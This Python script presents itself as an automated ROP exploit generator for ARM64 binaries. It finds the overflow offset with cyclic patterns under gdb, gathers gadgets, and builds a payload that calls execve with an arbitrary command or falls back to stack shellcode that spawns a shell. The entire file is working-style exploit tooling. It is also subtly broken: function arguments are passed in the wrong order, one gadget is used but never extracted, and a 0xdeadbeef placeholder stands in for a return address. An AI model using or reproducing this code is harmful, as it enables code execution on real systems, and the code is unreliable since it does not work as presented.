import os
import re
import argparse
import subprocess as subp
from elftools.elf.elffile import ELFFile
from capstone import *
from pwn import *

# Argument Parser Setup
parser = argparse.ArgumentParser(description="Automated ROP Exploit Generator for ARM64 Binaries")
parser.add_argument("--binary", required=True, help="Path to the vulnerable binary (ARM64).")
parser.add_argument("--command", default="/bin/sh -c 'id'", help="Command to execute with execve.")
parser.add_argument("--output", default="exploit_payload", help="Path to output the generated exploit payload.")
args = parser.parse_args()

# Setup Context
context.arch = 'aarch64'
context.log_level = 'info'

def locate_gadgets(binary_path):
    """Extract necessary gadgets from the binary."""
    gadgets = {}
    md = Cs(CS_ARCH_AARCH64, CS_MODE_ARM)
    md.detail = True

    with open(binary_path, "rb") as f:
        elf = ELFFile(f)
        for section in elf.iter_sections():
            if section.name == '.text':
                code = section.data()
                base_addr = section['sh_addr']
                for insn in md.disasm(code, base_addr):
                    if insn.mnemonic == "ret":
                        gadget = extract_gadget(md, code, base_addr, insn)
                        if gadget:
                            gadgets.update(gadget)
    return gadgets

def extract_gadget(md, code, base_addr, insn):
    """Extract a single gadget based on a return instruction."""
    offset = insn.address - base_addr
    start = max(0, offset - 16)  # Backtrace for instructions
    gadget_bytes = code[start:offset]
    gadget_insns = list(md.disasm(gadget_bytes, base_addr + start))[::-1]
    mapping = {}

    if len(gadget_insns) >= 1:
        if (gadget_insns[0].mnemonic == 'ldp' and
            'x0' in gadget_insns[0].op_str and 'x1' in gadget_insns[0].op_str):
            mapping['ldp x0, x1; ret'] = gadget_insns[0].address

        if (gadget_insns[0].mnemonic == 'str' and
            'x1' in gadget_insns[0].op_str and '[x0]' in gadget_insns[0].op_str):
            mapping['str x1, [x0]; ret'] = gadget_insns[0].address

    return mapping

def find_offset(binary_path, n=4, max_length=1024):
    """
    Finds the offset to overwrite the return address in the vulnerable binary.
    """
    padding_file = 'padding'
    low = 0
    high = max_length

    # Create a cyclic pattern to locate the offset
    while low < high:
        guess = (low + high) // 2
        padding = cyclic(guess, n=n)
        with open(padding_file, 'wb') as f:
            f.write(padding)

        # Run the binary with the pattern and capture PC
        gdb_cmd = [
            'gdb', '--batch',
            '--ex', f"run < {padding_file}",
            '--ex', 'info registers pc',
            binary_path
        ]
        gdb_output = subp.run(gdb_cmd, stdout=subp.PIPE, text=True).stdout
        os.remove(padding_file)

        # Extract PC value
        pc_match = re.search(r'pc\s+(0x[a-fA-F0-9]+)', gdb_output)
        if not pc_match:
            log.error("Failed to extract PC value from GDB output.")
            return -1

        pc = int(pc_match.group(1), 16)
        log.info(f"Extracted PC: {hex(pc)}")

        # Convert the PC to bytes and find its position in the pattern
        pc_bytes = p64(pc)[:n]  # Use 64-bit packing and slice according to `n`
        try:
            offset = cyclic_find(pc_bytes, n=n)
            log.info(f"Found offset: {offset}")
            return offset
        except ValueError:
            log.warning("PC not found in the cyclic pattern. Adjusting search range.")
            if pc < cyclic(guess, n=n)[-1]:
                high = guess
            else:
                low = guess + 1

    return -1  # Offset not found

def find_writable_memory(binary_path, offset):
    """
    Identifies a writable memory address. Falls back to executing shellcode on the stack.
    """
    try:
        # Use GDB to inspect the stack pointer
        gdb_command = [
            'gdb', '--batch',
            '--ex', 'b vulnerable_function',
            '--ex', f'run < /dev/null',
            '--ex', 'info registers sp',
            binary_path
        ]
        gdb_output = subp.run(gdb_command, stdout=subp.PIPE, stderr=subp.PIPE, text=True).stdout

        # Debugging output for writable memory
        print(f"GDB Output:\n{gdb_output}")

        # Locate the stack pointer
        sp_match = re.search(r'sp\s+(0x[a-fA-F0-9]+)', gdb_output)
        if not sp_match:
            log.error("Failed to locate the stack pointer in GDB output.")
            return None

        stack_pointer = int(sp_match.group(1), 16)
        print(f"Identified stack pointer: {hex(stack_pointer)}")

        # Check if overflow buffer is writable
        writable_addr = stack_pointer + offset
        if b'\x00' not in p64(writable_addr):
            log.info(f"Using stack-based writable memory at {hex(writable_addr)}")
            return writable_addr
        else:
            log.warning(f"Stack-based writable memory contains null bytes: {hex(writable_addr)}")

        # Fall back to `.bss` section
        with open(binary_path, "rb") as f:
            elf = ELFFile(f)

            # Use the `.bss` section
            bss_section = elf.get_section_by_name('.bss')
            if bss_section:
                writable_addr = bss_section.header.sh_addr
                if b'\x00' not in p64(writable_addr):
                    log.info(f"Using .bss section at {hex(writable_addr)}")
                    return writable_addr
                else:
                    log.warning(f".bss section contains null bytes: {hex(writable_addr)}")

    except Exception as e:
        log.error(f"Error identifying writable memory: {e}")

    # Fall back to stack-based shellcode execution
    log.warning("Falling back to stack-based shellcode execution.")
    return "stack"

def construct_payload(offset, binary_path, libc, cmd_args, gadgets):
    """
    Constructs the exploit payload. Falls back to shellcode execution on the stack if needed.
    """
    # Start the payload with padding
    payload = b'A' * offset

    # Determine writable memory or fallback to stack
    writable_addr = find_writable_memory(binary_path, offset)

    if writable_addr == "stack":
        # Include shellcode for spawning a shell
        shellcode = asm(shellcraft.sh())
        log.info(f"Using stack-based shellcode execution. Shellcode size: {len(shellcode)} bytes.")

        # Add shellcode to the payload
        payload += shellcode

        # Overwrite return address with the start of the buffer
        payload += p64(0xdeadbeef)  # Replace with the actual stack address if known
        return payload

    if writable_addr is None:
        log.error("Failed to find writable memory.")
        sys.exit(1)

    log.info(f"Using writable memory at address: {hex(writable_addr)}")

    # Prepare command-line arguments as null-terminated strings
    cmd_strings = [arg.encode() + b'\x00' for arg in cmd_args]
    cmd_lengths = [len(s) for s in cmd_strings]
    arg_addresses = [writable_addr + sum(cmd_lengths[:i]) for i in range(len(cmd_lengths))]

    # Ensure writable memory is null-byte free
    for addr in arg_addresses:
        if b'\x00' in p64(addr):
            log.error(f"Writable memory address contains null bytes: {arg_addresses}")
            sys.exit(1)

    # Write command-line arguments to memory
    for arg, addr in zip(cmd_strings, arg_addresses):
        for i in range(0, len(arg), 8):
            chunk = arg[i:i + 8].ljust(8, b'\x00')  # Pad to 8 bytes
            payload += flat([
                gadgets['ldp x0, x1; ret'], addr + i, u64(chunk),
                gadgets['str x1, [x0]; ret']
            ])

    # Construct argv array in memory
    argv_array_addr = writable_addr + sum(cmd_lengths) + 0x200
    for addr in arg_addresses:
        payload += flat([
            gadgets['ldp x0, x1; ret'], argv_array_addr, addr,
            gadgets['str x1, [x0]; ret']
        ])
        argv_array_addr += 8

    # Null-terminate argv array
    payload += flat([
        gadgets['ldp x0, x1; ret'], argv_array_addr, 0,
        gadgets['str x1, [x0]; ret']
    ])

    # Set up registers and call execve
    payload += flat([
        gadgets['ldp x0, x1; ret'], arg_addresses[0], argv_array_addr - 8,
        gadgets['ldp x1, x2; ret'], 0, 0,
        libc.symbols['execve']
    ])

    return payload

def main():
    """Main execution flow."""
    elf = ELF(args.binary)
    libc = ELF('/lib/aarch64-linux-gnu/libc.so.6')

    offset = find_offset(args.binary)
    writable_addr = find_writable_memory(args.binary, offset)
    gadgets = locate_gadgets(args.binary)

    payload = construct_payload(offset, gadgets, writable_addr, args.command.split(), libc)
    with open(args.output, 'wb') as f:
        f.write(payload)
    log.success(f"Payload written to {args.output}")

if __name__ == "__main__":
    main()
